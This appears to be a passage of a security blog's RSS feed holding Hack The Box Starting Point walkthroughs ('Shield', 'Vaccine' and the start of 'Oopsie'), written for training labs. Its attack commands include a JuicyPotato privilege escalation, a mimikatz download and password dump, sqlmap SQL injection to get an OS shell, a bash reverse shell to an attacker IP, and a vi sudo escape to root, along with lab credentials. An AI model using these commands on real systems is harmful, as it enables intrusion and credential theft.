href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard" rel="noopener noreferrer">this </a>document and run again. &#x1F60E;</p><pre><code class="language-bash">.\potato.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\inetpub\wwwroot\wordpress\wp-content\Uploads\sh3ll.bat -l 1337</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-145.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1599" height="434" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-145.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-145.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-145.png 1599w" sizes="(min-width: 720px) 720px"></figure><p><br>We are done. Now we have ultimate power. &#x1F920;&#x1F920;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-146.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="510" height="377"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-147.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="731" height="328" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-147.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-147.png 731w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-148.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="851" height="773" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-148.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-148.png 851w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation"><strong>04. Post Exploitation</strong></h3><p>Now we are at <code>NT AUTHORITY\SYSTEM</code> level. So let&#x2019;s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz </a>and see what we can pull. Mimikatz can be used to dump cached passwords. Download &#xA0;<code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-149.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1124" height="493" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-149.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-149.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-149.png 1124w" sizes="(min-width: 720px) 720px"></figure><p>Then we can run that file by typing <code>.\mcat</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-150.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="919" height="382" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-150.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-150.png 919w" sizes="(min-width: 720px) 720px"></figure><p><br>We execute mimikatz and use the sekurlsa command to extract logon passwords: <code>sekurlsa::logonpasswords</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-151.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="803" height="491" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-151.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-151.png 803w" sizes="(min-width: 720px) 720px"></figure><p>And we found the password <code>Password1234!</code> for domain user <code>Sandra</code>.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaCWJxaHniWSpPAiRIa%2F-MaCX1_CLo6zsW-pdUev%2Fimage.png?alt=media&amp;token=4c52c5e6-1f75-4d78-9363-ee53dd0992ec" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><p></p><p>Okay... I&#x2019;ll see you on the next box! <a href="https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/index.html">Pathfinder</a><strong> </strong>&#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Vaccine Walkthrough]]></title><description><![CDATA[After the Oopsie Walkthrough, here I'm with Vaccine box. Let's hack and grab the flags]]></description><link>https://h4rithd.com/blog/starting-point-htb-vaccine-walkthrough/</link><guid isPermaLink="false">60b65f9ea8ce8209ffb55d49</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Vaccine Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Fri, 30 Apr 2021 16:26:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/VaccineBG-.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/VaccineBG-.jpg" alt="Vaccine Walkthrough"><p>After the Oopsie Walkthrough, here I&apos;m with Vaccine box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>very easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-oopsie-walkthrough/index.html">Oopsie </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div>
<!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma6ZVXn8HPjGO1_C7O5%2F-Ma6adhLsdnklUuCDOrb%2Fimage.png?alt=media&amp;token=8795bc47-aceb-4af0-96df-b1cb16d543b6" class="kg-image" alt="Vaccine Walkthrough" loading="lazy"></figure><p>Then you can see the <strong>IP </strong>address for that machine. <strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma6bHFGGA_BKPvfND0L%2F-Ma6by2iwjjKwjRrXySq%2Fimage.png?alt=media&amp;token=057943cd-b56e-4b03-bdb5-9f57f3ce2ade" class="kg-image" alt="Vaccine Walkthrough" loading="lazy"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-96.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1492" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-96.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-96.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-96.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=63</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Linux</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong>01. Enumeration First &#x2026;</strong></h2><h3 id="011-fast-ports-scan"><strong>01.1 Fast ports scan</strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.46</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-97.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="605" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-97.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-97.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we know which ports are open,</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine"><strong>&#x200C;01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 21,22,80 -Pn 10.10.10.46</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-98.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="586" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-98.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-98.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>&#x200C;There are 3 main ports. Look at the SSH version info, the machine flavor is <a href="https://launchpad.net/ubuntu/+source/openssh/1:8.0p1-6build1" rel="noopener noreferrer"><code>Ubuntu Eoan</code></a>. &#xA0;And also some website is running on port 80 and Nmap indicate it as <code>MegaCrop Login</code>. Let&apos;s look what is inside ftp first.</p><h3 id="013-discover-more-on-port-21"><strong>01.3 Discover more on port 21</strong></h3><p>Do you remember that we had some ftp credentials from our previous box(Oopsie)? So, let&#x2019;s use them and check the login to ftp service.</p><ul><li>ftpuser : mc@F1l3ZilL4</li></ul><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-99.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1380" height="626" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-99.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-99.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-99.png 1380w" sizes="(min-width: 720px) 720px"></figure><p>We successfully logged in to the ftp server as <code>ftpuser</code>. Again let&apos;s enumerate to find any other thing.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-100.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="235" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-100.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-100.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>There is a backup.zip file in this ftp server. Before we check what is inside that zip file, we are going to download it to our machine.</p><blockquote><em>we can use </em><code><em>get filename</em></code><em> command to download any file from ftp server. Click <a href="https://www.serv-u.com/linux-ftp-server/commands">here</a> if you need learn ftp basic commands. &#x1F60E;&#x1F60E;</em></blockquote><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-101.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="257" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-101.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-101.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We can use <code>unzip</code> for extract any basic zip file. Here we can see <code>index.php</code> file but the zip file is protected by some kind of password.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-102.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1272" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-102.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-102.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-102.png 1272w" sizes="(min-width: 720px) 720px"></figure><p>We can check passwords from previous machines but trust me nothing works. It means we need to crack that zip file and grab the password. There are so many tools to crack zip file password. But I prefer using &#xA0;<a href="https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html" rel="noopener noreferrer"><code>fcrackzip</code></a></p><p>To install <code>fcrackzip</code>, type the following command and hit enter. &#x1F601;&#x1F601;</p><pre><code class="language-bash"> apt-get install fcrackzip
</code></pre><p>If you are on your <strong>very first time to use</strong> rockyou word list, you need to extract it.</p><pre><code class="language-bash">gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre><pre><code class="language-bash">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip</code></pre><pre><code class="language-bash">-u	: Use unzip to weed out wrong passwords
-D	: Use a dictionary
-p	: Use string as initial password/file</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-103.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1414" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-103.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-103.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-103.png 1414w" sizes="(min-width: 720px) 720px"></figure><p>As you can feel it&apos;s too fast than using <code>John the Ripper</code>, isn&apos;t it? Now we have password, so... let&apos;s unzip that archive to get <code>index.php</code> file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-104.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="304" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-104.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-104.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Oh! there is a css file also. First of all, check <code>index.php</code> file..</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-105.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="2000" height="614" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-105.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-105.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-105.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-105.png 2156w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the very first lines, we can see the credentials. But here, the password is in md5 hash format. Let&apos;s try to decode it using online <a href="https://crackstation.net/" rel="noopener noreferrer">crackstation </a>site.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-107.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1323" height="497" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-107.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-107.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-107.png 1323w" sizes="(min-width: 720px) 720px"></figure><p><br>Oh! what a simple password. So now the credentials are,</p><ul><li><code>admin : qwerty789</code></li></ul><h3 id="014-discover-more-on-port-80"><strong>01.4 Discover more on port 80</strong></h3><p>Now let&apos;s jump to the port 80, Here we have <strong>MegaCrop Login</strong> page and now we have the credentials. Let&apos;s use it to login. What the hell, I think we could simply get that password if we brute forced that login page using <code>rockyou</code> password list. Isn&apos;t it? &#x1F926;&#x200D;&#x2642;&#xFE0F;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-108.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="595" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-108.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-108.png 1000w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-109.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="584" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-109.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-109.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Finally, we have only one function on this site and it is <strong>search</strong> option. Let&apos;s fire up <code>Burp Suite</code> and check what are the requests going through.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-111.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="470" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-111.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-111.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>&#x200C;When looking at the request, &#xA0;a lot of vulnerabilities came to my head but nothing worked except <code>SQL Injection</code>.</p><hr><h2 id="02-foothold"><strong>02. Foothold</strong></h2><p>Let&apos;s jump to <code>sqlmap</code> . As you can see here, the request is a GET request. You can simply add <code>*</code> to your value of parameter (in this case it is search) which you want to scan. But keep in mind that we now have access to the system. It means, to use search function you must need a valid session token. So we are going to pass the &#xA0;<strong>PHPSESSID </strong>as a cookie parameter.</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --dbs --batch</code></pre><pre><code class="language-bash">--dbs	: get the database list
--batch	: Never ask for user input, use the default behavior</code></pre><blockquote><em>Click <a href="https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d">here</a> If you need SQLMap Cheat Sheet</em></blockquote><p>Here is the output &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-112.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1325" height="667" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-112.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-112.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-112.png 1325w" sizes="(min-width: 720px) 720px"></figure><p>When looking at the output we can see that there are 3 main databases. You can enumerate all the tables and fetch data from the databases.</p><h3 id="021-get-user-shell"><strong>02.1 Get User Shell</strong></h3><p>There are 2 main ways to get user shell in this box.</p><ul><li>Using SQLMap <code>--os-shell</code> command.</li><li>Enumerating all the tables.</li></ul><p>Here I will show the 1st step: We could use the SQLMap flag <code>--os-shell</code> to gain a shell and after that gain an upgraded reverse shell with the next commands. However I lost the connection sometimes with this method. Anyway first try it out. It&apos;s very simple, type bellow command on your terminal.</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --os-shell --batch</code></pre><p>Then your shell will look like this &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-113.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="761" height="242" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-113.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-113.png 761w" sizes="(min-width: 720px) 720px"></figure><p><br>Now, time to upgrade that ugly shell. &#x1F385;&#x1F385; Start netcat listener on whatever port you like (In this case it&apos;s 4848) and run below command on os-shell.&#x1F447;</p><pre><code class="language-bash">bash -c &apos;bash -i &amp;&gt;/dev/tcp/&lt;YourIP&gt;/4848 &lt;&amp;1&apos; &amp;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-114.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1449" height="280" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-114.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-114.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-114.png 1449w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s check the 2nd step: Now we need to enumerate the database and to find users and the passwords. So let&apos;s get started.</p><p>Without enumerate the table one by one we can use a simple command to find the passwords on the database using <code>--password</code> flag.&#x1F474;&#x1F474; Pretty cool right? &#x1F929;</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --batch --passwords
</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-115.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="969" height="391" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-115.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-115.png 969w" sizes="(min-width: 720px) 720px"></figure><p><br>So we found one user <code>postgres</code> and the password from md5 hash format. I tried to crack this hash with john and hashcat, however a quick google search could save some time.(Remove the &apos;md5&apos; part beginning.)</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-116.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1235" height="643" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-116.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-116.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-116.png 1235w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-117.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="881" height="347" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-117.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-117.png 881w" sizes="(min-width: 720px) 720px"></figure><p>No we have new credentials, let&apos;s check them trough SSH.</p><ul><li><code>postgres :P@s5w0rd!</code></li></ul><p>I don&apos;t know why it hasn&apos;t got any user flag. Then I checked statistics on this box and it showed me this.&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-118.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1174" height="527" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-118.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-118.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-118.png 1174w" sizes="(min-width: 720px) 720px"></figure><p>This means we have no any user.txt in this box. Let&apos;s find root.txt.</p><hr><h3 id="03-privilege-escalation-%E2%80%A6"><strong>03. Privilege Escalation &#x2026;</strong></h3><p>First thing first! Let&apos;s check what are the commands that we can run as super user permission.</p><pre><code class="language-bash">sudo -l</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-119.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1000" height="412" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-119.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-119.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Looks like we can run the command &#x201C;<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>&#x201D; as <code>sudo</code>, So by running it and adding &#x201C;<code>:!/bin/bash</code>&#x201D; inside the vi editor, we got ourselves a root shell.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-120.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="616" height="547" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-120.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-120.png 616w"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-121.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="503" height="106"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-122.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="875" height="775" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-122.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-122.png 875w" sizes="(min-width: 720px) 720px"></figure><p>I&#x2019;ll see you on the next retired machine! <strong><a href="https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/index.html">Shield</a></strong> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a><br></p>]]></content:encoded></item><item><title><![CDATA[Oopsie Walkthrough]]></title><description><![CDATA[After the Archetype Walkthrough, here I'm with Oopsie box. Let's hack and grab the flags.

]]></description><link>https://h4rithd.com/blog/starting-point-htb-oopsie-walkthrough/</link><guid isPermaLink="false">60b65b2ba8ce8209ffb55c6a</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Oopsie Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Thu, 29 Apr 2021 16:07:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/OopsieBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/OopsieBG.jpg" alt="Oopsie Walkthrough"><p>After the Archetype Walkthrough, here I&apos;m with Oopsie box. Let&apos;s hack and grab the flags.</p><hr><p>In ours pervious <a href="https://h4rithd.com/blog/starting-point-htb-archetype-walkthrough/index.html">Archetype </a>Walkthrough, I mentioned that the starting point machines are a series of 9 machines rated as &quot;<strong>very easy&quot; </strong>and should be rooted in a sequence. So it means, if you need to go through this box, you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-archetype-walkthrough/index.html">Archetype</a> machine.</p><p>Enough talks &#x1F971;, let&apos;s start to hack. &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, Just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-21.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="465" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-21.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-21.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP</strong> address for that machine.<strong> &#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-22.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="429" height="525"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-23.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1526" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-23.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-23.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-23.png 1526w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=63</code>. There is one route between machine and us (VPN) so it&apos;s definitely it will be <code>Linux</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong>01. Enumeration First &#x2026;</strong></h2><h3 id="%E2%80%8C011-fast-ports-scan"><strong>&#x200C;01.1 Fast ports scan</strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.28</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-24.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="672" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-24.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-24.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we know which ports are open, Here we can see some &#xA0;<strong>* (Interesting)</strong> ports.</p><hr><h3 id="012-run-nmap-scripting-engine"><strong>01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all the open ports. So we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.28</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-25.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="548" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-25.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-25.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>I have some trick to identify the Operating System using 